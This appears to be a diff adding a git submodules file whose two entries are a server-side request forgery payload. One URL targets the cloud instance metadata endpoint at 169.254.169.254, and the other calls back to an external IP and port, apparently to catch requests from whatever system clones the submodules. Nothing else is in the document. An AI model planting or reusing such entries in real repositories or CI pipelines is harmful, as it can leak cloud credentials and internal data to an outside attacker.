@@ -1,0 +1,6 @@
+[submodule "internal-imds"]
+    path = internal-imds
+    url = http://169.254.169.254/latest/meta-data/
+[submodule "callback"]
+    path = callback
+    url = http://44.211.128.59:8765/submodule-fetch
